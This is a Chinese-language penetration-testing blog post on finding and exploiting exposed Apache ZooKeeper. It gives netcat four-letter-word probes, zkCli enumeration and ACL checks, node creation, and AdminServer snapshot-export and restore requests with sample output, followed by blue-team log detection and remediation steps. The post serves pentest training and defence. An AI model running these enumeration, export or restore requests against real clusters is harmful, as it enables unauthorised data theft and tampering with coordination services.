---
title: "ZooKeeper管理面打点与接口利用技术"
date: 2026-06-15T13:24:22+08:00
draft: false
weight: 62
description: "围绕ZooKeeper相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "ZooKeeper"]
---

# ZooKeeper管理面打点与接口利用技术

`Apache ZooKeeper` 是典型的高价值分布式协调控制平面。它并不是一个普通“配置库”，而是大量中间件和分布式系统用于保存：

- 集群成员关系
- leader 选举状态
- 服务注册信息
- 配置项与动态开关
- 锁、队列、选举与会话元数据
- 依赖它的上层系统关键路径

对攻击者来说，ZooKeeper 的价值不止于“2181 端口开放”，而在于它经常能把内部中间件拓扑、业务命名、broker 清单、控制节点路径和 ACL 设计一次性暴露出来。尤其在 Kafka、HBase、Dubbo、ClickHouse、Solr、Hadoop 等场景里，ZooKeeper 往往是进入整个系统画像的高收益入口。

一旦 ZooKeeper 对低信任网络暴露、四字命令白名单配置过宽、AdminServer 被公开、ACL 缺失或仅依赖 `world:anyone`、超级用户摘要泄露，攻击者通常可以在很短时间内回收：

- ensemble 角色分布与 leader 信息
- 节点数量、连接数、watch 数、会话数
- 具体 `znode` 路径与业务命名体系
- ACL 设计与可读可写边界
- Snapshot / Restore 面
- 依赖 ZooKeeper 的上游服务和配置对象

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 ZooKeeper
2. 如何围绕四字命令、AdminServer 与 CLI 建立资产画像
3. 如何从 `znode`、ACL、快照与恢复面判断真实收益
4. 哪些请求与响应最值得保留
5. 蓝队如何从访问日志、审计日志与 JVM/服务日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `2181/tcp`
- `2281/tcp`
- `8080/tcp`
- `8081/tcp`
- `/commands`
- `/commands/ruok`
- `/commands/stat`
- `/commands/srvr`
- `/commands/mntr`
- `/commands/conf`
- `/commands/cons`
- `/commands/dump`
- `/commands/wchs`
- `/commands/wchc`
- `/commands/wchp`
- `/commands/snapshot`
- `/commands/restore`

如果目标是传统 TCP 面，还应优先尝试：

- `ruok`
- `srvr`
- `stat`
- `mntr`
- `conf`
- `cons`
- `dump`
- `envi`
- `isro`

### 0.2 协议与认证边界

ZooKeeper 常见访问方式包括：

- TCP `2181` 上的四字命令
- 原生客户端协议
- `zkCli.sh`
- AdminServer HTTP 接口
- JMX

常见安全边界包括：

- 无 ACL 或仅 `world:anyone`
- `digest`
- `x509`
- `ip`
- 超级用户 `superDigest`

需要特别注意的是：

- 现代版本默认不会像历史环境那样完全开放全部四字命令
- `3.5+` 开始，很多四字命令默认需要显式进入 `4lw.commands.whitelist`
- 即使关闭 AdminServer，TCP 四字命令面也可能仍然存在

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，ZooKeeper 的打点收益一般可排为：

1. 确认是否为 ZooKeeper、是否存在 leader、四字命令是否可用
2. 枚举 `stat/srvr/mntr/conf/envi`，建立节点与性能画像
3. 判断 `ls /`、`get /path`、`getAcl /path` 是否可用
4. 判断 `AdminServer` 是否可读以及 `snapshot/restore` 是否暴露
5. 判断是否存在超级用户摘要、弱 ACL、开放根路径或递归配置泄露

---

## 1. 第一轮打点：确认是否为 ZooKeeper

### 1.1 `ruok`

`ruok` 是最轻量也最常见的探针之一。

#### 请求示例

```bash
printf 'ruok' | nc zk.target.example 2181
```

#### 典型响应示例

```text
imok
```

这类响应能直接说明：

- 目标大概率就是 ZooKeeper
- TCP `2181` 可达
- 服务至少在基础存活状态

### 1.2 `srvr`

#### 请求示例

```bash
printf 'srvr' | nc zk.target.example 2181
```

#### 典型响应示例

```text
Zookeeper version: 3.8.4-4f0b4b1f7fd9f6204db4f6c304b1d52c2f5f56b9, built on 2025-08-30 05:22 UTC
Latency min/avg/max: 0/1/14
Received: 28194
Sent: 28190
Connections: 16
Outstanding: 0
Zxid: 0x1200008a4
Mode: follower
Node count: 1842
```

这条响应会直接回收：

- 版本号
- 延迟
- 连接数
- `zxid`
- 当前角色
- `znode` 数量

### 1.3 `stat`

#### 请求示例

```bash
printf 'stat' | nc zk.target.example 2181
```

#### 典型响应示例

```text
Zookeeper version: 3.8.4-4f0b4b1f7fd9f6204db4f6c304b1d52c2f5f56b9, built on 2025-08-30 05:22 UTC
Clients:
 /10.10.10.21:55412[0](queued=0,recved=1,sent=0)
 /10.20.41.18:60274[1](queued=0,recved=8,sent=9)

Latency min/avg/max: 0/1/14
Received: 28194
Sent: 28190
Connections: 16
Outstanding: 0
Zxid: 0x1200008a4
Mode: leader
Node count: 1842
```

与 `srvr` 相比，`stat` 更危险的地方在于它还可能暴露：

- 当前连接的客户端来源地址
- 每个会话的收发统计

### 1.4 白名单失败响应也有价值

现代 ZooKeeper 版本中，很多四字命令默认关闭。如果目标返回：

```text
stat is not executed because it is not in the whitelist.
```

这同样有价值，因为它说明：

- 目标是 `3.5+` 或更接近现代配置风格
- 四字命令仍然存在，但启用了白名单
- 后续应转向已经放行的命令、AdminServer 或原生客户端协议

---

## 2. 第二轮打点：四字命令建立集群画像

### 2.1 `mntr`

官方管理员文档明确指出，`mntr` 提供的是更适合机器解析的监控输出。

#### 请求示例

```bash
printf 'mntr' | nc zk.target.example 2181
```

#### 典型响应示例

```text
zk_version	3.8.4
zk_avg_latency	0
zk_max_latency	15
zk_min_latency	0
zk_packets_received	1204
zk_packets_sent	1205
zk_num_alive_connections	3
zk_outstanding_requests	0
zk_server_state	leader
zk_znode_count	142
zk_watch_count	28
zk_ephemerals_count	12
zk_approximate_data_size	10847
zk_followers	4
zk_synced_followers	4
```

这条响应是 ZooKeeper 打点里价值最高的指标面之一，因为它能直接回收：

- server state
- znode 数量
- watch 数量
- ephemeral 节点数量
- 近似数据规模
- follower 与 synced follower 数量

### 2.2 `conf`

#### 请求示例

```bash
printf 'conf' | nc zk.target.example 2181
```

#### 典型响应示例

```text
clientPort=2181
dataDir=/var/lib/zookeeper
dataLogDir=/var/lib/zookeeper/log
tickTime=2000
initLimit=10
syncLimit=5
server.1=10.20.30.41:2888:3888:participant
server.2=10.20.30.42:2888:3888:participant
server.3=10.20.30.43:2888:3888:participant
4lw.commands.whitelist=mntr,ruok,srvr,stat,isro,conf
admin.enableServer=true
admin.serverPort=8080
```

这类返回可以直接暴露：

- 数据目录
- 日志目录
- ensemble 成员
- 四字命令白名单
- AdminServer 是否开启

### 2.3 `envi`

#### 请求示例

```bash
printf 'envi' | nc zk.target.example 2181
```

#### 典型响应示例

```text
zookeeper.version=3.8.4-4f0b4b1f7fd9f6204db4f6c304b1d52c2f5f56b9
host.name=zk-node-1
java.version=17.0.12
java.vendor=Eclipse Adoptium
os.name=Linux
os.arch=amd64
user.name=zookeeper
user.dir=/opt/zookeeper
```

`envi` 的价值在于：

- 回收 JVM 版本
- 回收主机名
- 回收运行账户
- 回收工作目录

### 2.4 `cons`

#### 请求示例

```bash
printf 'cons' | nc zk.target.example 2181
```

#### 典型响应示例

```text
 /10.20.41.18:60274[1](queued=0,recved=8,sent=9,sid=0x10027ab7c550001,lop=PING,est=17500,to=30000,lcxid=0x8,lzxid=0x1200008a4,lresp=5264283,llat=0,minlat=0,avglat=1,maxlat=4)
 /10.20.41.19:60310[1](queued=0,recved=44,sent=48,sid=0x10027ab7c55000a,lop=GET,est=18911,to=30000,lcxid=0x1b,lzxid=0x1200008a4,lresp=5264286,llat=1,minlat=0,avglat=1,maxlat=9)
```

这类输出直接暴露：

- 活跃客户端地址
- session id
- 最近操作类型
- 延迟与超时

### 2.5 `dump`

#### 请求示例

```bash
printf 'dump' | nc zk.target.example 2181
```

#### 典型响应示例

```text
SessionTracker dump:
0x10027ab7c550001 expires at Tue Jun 15 16:41:56 CST 2026
0x10027ab7c55000a expires at Tue Jun 15 16:42:03 CST 2026
Ephemeral nodes dump:
Sessions with Ephemerals (2):
0x10027ab7c55000a:
/brokers/ids/2
/controller
```

这类输出的价值极高，因为它会直接把：

- session
- ephemeral node
- 典型上游系统路径

暴露出来。Kafka 场景下，`/brokers/ids/*`、`/controller`、`/admin/*` 都是非常高收益的线索。

### 2.6 `wchs` / `wchc` / `wchp`

这些命令会围绕 watch 做更深的画像：

- `wchs`：watch 摘要
- `wchc`：watcher by session
- `wchp`：watcher by path

一旦开放，通常可以直接帮助建立：

- 哪些路径最活跃
- 哪些会话在监听关键 `znode`

---

## 3. 第三轮打点：AdminServer 与 HTTP 管理面

### 3.1 `/commands`

官方管理员文档说明，较新版本引入了 `AdminServer`。如果 `admin.enableServer=true`，通常会开放 HTTP 命令接口。

#### 请求示例

```http
GET /commands HTTP/1.1
Host: zk.target.example:8080
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "commands": [
    "ruok",
    "srvr",
    "stat",
    "mntr",
    "conf",
    "cons",
    "dump",
    "snapshot",
    "restore"
  ]
}
```

### 3.2 `/commands/mntr`

#### 请求示例

```http
GET /commands/mntr HTTP/1.1
Host: zk.target.example:8080
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "zk_version": "3.9.4",
  "zk_server_state": "leader",
  "zk_znode_count": 1842,
  "zk_watch_count": 117,
  "zk_ephemerals_count": 203,
  "zk_followers": 2,
  "zk_synced_followers": 2
}
```

这类响应与 TCP 四字命令类似，但更适合自动化采集和批量遍历。

### 3.3 `/commands/conf`

#### 请求示例

```http
GET /commands/conf HTTP/1.1
Host: zk.target.example:8080
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "client_port": 2181,
  "data_dir": "/var/lib/zookeeper",
  "data_log_dir": "/var/lib/zookeeper/log",
  "tick_time": 2000,
  "server.1": "10.20.30.41:2888:3888:participant",
  "server.2": "10.20.30.42:2888:3888:participant",
  "admin.enableServer": true,
  "admin.serverPort": 8080
}
```

### 3.4 `snapshot` / `restore`

`3.9.x` 官方文档明确说明，Snapshot 和 Restore 通过 AdminServer API 操作，并要求根路径具备 `ALL` 权限；同时还提到该面受速率限制。

#### 请求示例

```http
GET /commands/snapshot?streaming=true HTTP/1.1
Host: zk.target.example:8080
Authorization: digest root:root_passwd
Connection: close
```

#### 典型成功响应示例

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="snapshot.bin"
```

#### 典型失败响应示例

```json
{
  "error": "KeeperErrorCode = NoAuth for /"
}
```

一旦能导出 snapshot，攻击价值已经不再只是“在线侦察”，而是进入离线恢复与全局数据分析阶段。

### 3.5 新版权限缺陷风险

2026 年公开披露的 `CVE-2025-58457` 说明：

- `3.9.0` 到 `<3.9.4` 的 AdminServer 在 `snapshot/restore` 上存在权限检查问题
- 官方建议升级到 `3.9.4`
- 或通过关闭 `admin.snapshot.enabled`、`admin.restore.enabled`、`admin.enableServer` 进行缓解

这意味着对于较新的 ZooKeeper，AdminServer 不只是“方便的 HTTP 面”，而是需要单独审视的高风险面。

---

## 4. 第四轮打点：CLI、znode 与业务路径

### 4.1 连接与根路径枚举

官方 `zkCli.sh` 文档说明，最基础的连接方式就是：

#### 请求示例

```bash
bin/zkCli.sh -server zk.target.example:2181
```

#### 典型连接响应示例

```text
Connecting to zk.target.example:2181
2026-06-15 16:51:33,189 [myid:zk.target.example:2181] - INFO [main-SendThread(zk.target.example:2181):ClientCnxn$SendThread@1421] - Session establishment complete on server zk.target.example:2181, sessionid = 0x10007ab7c550007, negotiated timeout = 30000
```

#### 枚举请求示例

```bash
ls /
```

#### 典型响应示例

```text
[brokers, config, consumers, dubbo, hbase, zookeeper]
```

这一步可以直接建立：

- 中间件类型
- 上层业务框架
- 命名方式

### 4.2 读取具体 znode

#### 请求示例

```bash
get /brokers/ids/1
```

#### 典型响应示例

```json
{"listener_security_protocol_map":{"PLAINTEXT":"PLAINTEXT"},"endpoints":["PLAINTEXT://10.20.41.51:9092"],"jmx_port":-1,"host":"10.20.41.51","timestamp":"1750011248123","port":9092,"version":4}
```

这类返回可以直接把上层系统进一步落到：

- broker 地址
- 端口
- 协议
- 版本

### 4.3 递归枚举

#### 请求示例

```bash
ls -R /config
```

#### 典型响应示例

```text
/config
/config/topics
/config/topics/payment-events
/config/users
/config/users/stream-admin
```

### 4.4 `getAcl`

#### 请求示例

```bash
getAcl /config/topics/payment-events
```

#### 典型成功响应示例

```text
'world,'anyone : cdrwa
```

#### 典型受限响应示例

```text
Insufficient permission : /config/topics/payment-events
```

这一步极其关键，因为它能明确告诉你：

- 是否存在匿名读写
- 是否是 `digest`
- ACL 到底收到了什么粒度

### 4.5 `addauth digest`

官方 CLI 文档明确说明，ACL 常见的追加方式是 `addauth digest user:pass`。

#### 请求示例

```bash
addauth digest user1:12345
getAcl /acl_digest_test
```

#### 典型响应示例

```text
'digest,'user1:+owfoSBn/am19roBPzR1/MfCblE=
 : cdrwa
```

这类响应对攻击者的意义在于：

- 一旦拿到业务侧泄露的 `digest` 凭据，就能快速判断其覆盖范围
- 可以进一步判断是否存在超级用户摘要或路径级过宽授权

### 4.6 创建节点的边界

#### 请求示例

```bash
create -e /ephemeral_node mydata
```

#### 典型成功响应示例

```text
Created /ephemeral_node
```

#### 典型失败响应示例

```text
KeeperErrorCode = NoAuth for /ephemeral_node
```

一旦这类创建成功，风险已经从“读取画像”升级为“向协调平面注入状态”。

---

## 5. 第五轮打点：ACL、超级用户与权限边界

### 5.1 ACL 不是递归安全边界

ZooKeeper ACL 的一个关键点在于：

- 默认不会天然帮你把整棵子树都正确收紧
- 现实里经常出现根节点或某些中间节点仍然开放给 `world:anyone`

这也是为什么 `ls /` 和 `getAcl /` 在打点中几乎总是高优先级。

### 5.2 `world:anyone`

#### 典型 ACL 示例

```text
'world,'anyone : cdrwa
```

这意味着：

- 任意未认证客户端都具备完整读写建删与 ACL 管理能力

### 5.3 `digest`

#### 典型 ACL 示例

```text
'digest,'appuser:+owfoSBn/am19roBPzR1/MfCblE= : cdrwa
```

这意味着：

- 目标需要对应的 `digest` 凭据
- 一旦凭据从配置文件、环境变量或日志中泄露，就能直接转为有效访问

### 5.4 `superDigest`

CLI 与管理员文档都提到，ZooKeeper 可以通过：

- `zookeeper.DigestAuthenticationProvider.superDigest`
- `zookeeper.X509AuthenticationProvider.superUser`

定义超级用户。这类配置一旦泄露，影响远大于普通路径 ACL，因为它会绕过 ACL 检查并拥有全局控制能力。

---

## 6. 第六轮打点：Snapshot、数据目录与离线价值

### 6.1 数据目录与日志目录

管理员文档明确说明 ZooKeeper 会在数据目录中保存：

- snapshot 文件
- transaction log 文件

#### 常见配置示例

```text
dataDir=/var/lib/zookeeper
dataLogDir=/var/lib/zookeeper/log
```

这意味着如果攻击者已经进入主机层面，除了在线协议外，还可以直接关注：

- `version-2/snapshot.*`
- `version-2/log.*`

### 6.2 Snapshot AdminServer

#### 请求示例

```http
GET /commands/snapshot?streaming=true HTTP/1.1
Host: zk.target.example:8080
Authorization: digest root:root_passwd
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
```

### 6.3 Restore AdminServer

#### 请求示例

```http
POST /commands/restore HTTP/1.1
Host: zk.target.example:8080
Authorization: digest root:root_passwd
Content-Type: application/octet-stream
Connection: close

<snapshot binary>
```

#### 典型响应示例

```json
{
  "status": "restore started"
}
```

这类接口属于极高风险面，因为：

- `snapshot` 意味着可离线导出整个状态库
- `restore` 意味着开始触及控制平面恢复与覆盖面

### 6.4 快照恢复链的意义

官方 `3.9.x` 恢复文档明确指出：

- 所有成员应使用同一 snapshot 恢复
- 恢复应先阻断客户端流量
- 应保留原始 `dataDir` 与 `dataLogDir`

对攻击者来说，这说明一旦导出快照，后续完全可以在离线环境里：

- 重建 `znode` 树
- 还原 ACL 与路径结构
- 建立中间件与业务关系图

---

## 7. 高危错误部署场景

### 7.1 四字命令白名单过宽

如果 `4lw.commands.whitelist=*`，或至少开放了：

- `stat`
- `mntr`
- `conf`
- `cons`
- `dump`
- `wchs`
- `wchc`
- `wchp`

那么攻击者就能在非常低的成本下建立完整画像。

### 7.2 仅保留 `srvr` 也不代表低风险

Datadog 等监控文档都强调很多监控方案依赖 `stat` 与 `mntr`。如果环境为了监控方便把它们一起放开，而没有做网络边界收敛，风险会显著提高。

### 7.3 AdminServer 对外暴露

一旦 `admin.enableServer=true` 且 HTTP 面对低信任网络开放，ZooKeeper 的打点门槛会进一步降低，因为：

- 不再需要原始 TCP 协议交互
- 更容易批量化采集
- `snapshot/restore` 风险面也会显式出现

### 7.4 根路径 ACL 开放

如果 `/` 的 ACL 存在：

```text
'world,'anyone : cdrwa
```

那么很多后续路径都可能被间接读取、创建或覆盖。

### 7.5 版本风险

`3.9.0` 到 `<3.9.4` 的 `AdminServer snapshot/restore` 权限缺陷应视为单独高危检查项，尤其在：

- 已启用 AdminServer
- 已放开 snapshot/restore
- 根路径 ACL 仍然开放

的情况下风险更高。

---

## 8. 蓝队检测与处置

### 8.1 网络与访问日志

应重点识别：

- 来自非常规来源的 `2181` 长连接与短连接探测
- 对 `8080` 或 `8081` 的 `/commands/*` 访问
- 短时间内连续出现 `ruok -> srvr -> mntr -> conf -> cons -> dump`
- 对 `snapshot` / `restore` 的访问

#### 日志示例

```text
10.10.10.21 - - [15/Jun/2026:18:31:11 +0800] "GET /commands/mntr HTTP/1.1" 200 241 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [15/Jun/2026:18:31:13 +0800] "GET /commands/conf HTTP/1.1" 200 512 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [15/Jun/2026:18:31:16 +0800] "GET /commands/snapshot?streaming=true HTTP/1.1" 403 41 "-" "curl/8.7.1"
```

第三条即便失败，也应视为高优先级调查事件。

### 8.2 ZooKeeper 服务日志

应重点关注：

- 会话建立与关闭
- 认证失败
- ACL 失败
- 4lw 执行记录
- AdminServer 命令执行

#### 日志示例

```text
2026-06-15 18:31:41,178 [myid:1] - INFO  [NIOServerCxnFactory.AcceptThread:ZooKeeperServer@973] - accepted socket connection from /10.10.10.21:55124
```

#### 日志示例

```text
2026-06-15 18:31:44,991 [myid:1] - WARN  [ProcessThread(sid:0 cport:2181)::ZooKeeperServer@1127] - Exception causing close of session 0x10027ab7c55000a due to auth failure
```

#### 日志示例

```text
2026-06-15 18:31:49,107 [myid:1] - WARN  [AdminServer request processing thread-3:Commands@245] - Command snapshot failed for /10.10.10.21 due to KeeperErrorCode = NoAuth for /
```

### 8.3 审计日志

现代 ZooKeeper 版本支持审计日志。应重点关注：

- `create`
- `delete`
- `setData`
- `setAcl`
- `reconfig`
- `snapshot`
- `restore`

#### 审计示例

```json
{
  "session": "0x10027ab7c55000a",
  "user": "digest:user1",
  "op": "getAcl",
  "path": "/config/topics/payment-events",
  "result": "OK"
}
```

#### 审计示例

```json
{
  "session": "0x10027ab7c55000a",
  "user": "world:anyone",
  "op": "ls",
  "path": "/",
  "result": "OK"
}
```

### 8.4 监控指标

`mntr` 输出与监控系统可帮助识别：

- `zk_server_state`
- `zk_watch_count`
- `zk_ephemerals_count`
- `zk_outstanding_requests`
- `zk_num_alive_connections`

如果这些指标在非常规时间窗口出现异常上涨，同时伴随：

- 新的客户端来源
- `cons` / `dump` / `snapshot` 调用

就应优先判定为异常打点或入侵调查事件。

### 8.5 处置建议

发现 ZooKeeper 管理面被打点后，应优先做：

1. 收敛 `2181` 与 AdminServer 暴露范围
2. 检查 `4lw.commands.whitelist`，移除不必要命令
3. 关闭或限制 `admin.enableServer`
4. 审核根路径与关键路径 ACL，移除 `world:anyone:cdrwa`
5. 检查是否有 `superDigest`、业务 `digest` 凭据泄露
6. 检查是否已经发生 `snapshot`、`restore`、`setAcl` 或异常节点创建

长期建议：

- 不把 ZooKeeper 暴露给低信任网络
- 只保留最小必要的四字命令白名单
- 对 `snapshot`、`restore` 和 `reconfig` 单独告警
- 对根路径和关键业务路径定期做 ACL 巡检
- 对依赖 ZooKeeper 的 Kafka / HBase / Dubbo / Solr 路径做专项审计

---

## 9. 复盘清单

### 9.1 红队侧

- 是否确认了四字命令是否可用以及白名单范围
- 是否完成了 `srvr`、`mntr`、`conf`、`cons`、`dump` 的画像
- 是否验证了 `AdminServer` 是否开放以及 `snapshot/restore` 是否存在
- 是否完成了 `/` 与关键业务路径的 `ls/get/getAcl`
- 是否确认了 `digest`、`superDigest`、`x509` 等边界

### 9.2 蓝队侧

- 是否能识别从 `ruok -> srvr -> mntr -> conf -> dump` 的连续访问链
- 是否能识别 `2181` 上的非常规客户端来源
- 是否能识别对 `/commands/snapshot`、`/commands/restore` 的 HTTP 访问
- 是否掌握了哪些业务系统仍依赖 ZooKeeper 并可能暴露高价值路径

### 9.3 应急侧

- 是否确认是否已有 `znode` 树、ACL 或 snapshot 被导出
- 是否确认是否已有异常 `create/setAcl/reconfig`
- 是否完成超级用户、业务摘要与下游中间件凭据轮换
- 是否完成四字命令、AdminServer 与网络暴露面的收敛

---

## 10. 总结

`ZooKeeper` 的真正风险，不只是“2181 端口能连通”，而在于它可能同时暴露：

- 集群角色
- client 会话
- watch 与 ephemeral 节点
- 配置目录树
- ACL 设计
- AdminServer 快照与恢复能力
- 上游业务系统命名与地址

对打点来说，更值得沉淀的方法学是：

- 先用 `ruok`、`srvr`、`stat`、`mntr` 确认 ZooKeeper 与集群状态
- 再用 `conf`、`cons`、`dump` 建立节点与客户端画像
- 再转入 `zkCli` 做 `znode` 与 ACL 递进式验证
- 最后判断 `AdminServer`、`snapshot/restore` 和新版权限缺陷是否存在

只有把这些面串起来，才能把“ZooKeeper 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [ZooKeeper Administrator's Guide](https://zookeeper.apache.org/doc/current/zookeeperAdmin.html)
- [ZooKeeper Administrator's Guide 3.4.x](https://zookeeper.apache.org/doc/r3.4.10/zookeeperAdmin.html)
- [ZooKeeper Snapshot and Restore Guide](https://zookeeper.apache.org/doc/r3.9.4/zookeeperSnapshotAndRestore.html)
- [ZooKeeper CLI](https://zookeeper.apache.org/doc/r3.7.2/zookeeperCLI.html)
- [ZooKeeper CLI 3.6](https://zookeeper.apache.org/doc/r3.6.0/zookeeperCLI.html)
- [Apache ZooKeeper Information Disclosure](https://www.rapid7.com/db/modules/auxiliary/gather/zookeeper_info_disclosure/)
- [ZooKeeper integration notes](https://docs.datadoghq.com/integrations/zookeeper/)
